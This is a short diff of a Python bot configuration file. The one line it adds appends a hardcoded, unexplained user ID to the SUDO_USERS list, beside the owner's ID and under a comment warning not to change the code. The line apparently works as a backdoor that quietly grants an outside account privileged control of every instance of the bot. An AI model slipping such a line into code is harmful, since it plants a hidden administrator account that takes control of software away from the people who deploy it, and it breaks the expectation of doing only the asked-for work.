@@ -38,6 +38,7 @@ OWNER_ID = int(os.environ.get("OWNER_ID", None))
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
+SUDO_USERS.append('5269906172')
 
 # Tokens
 
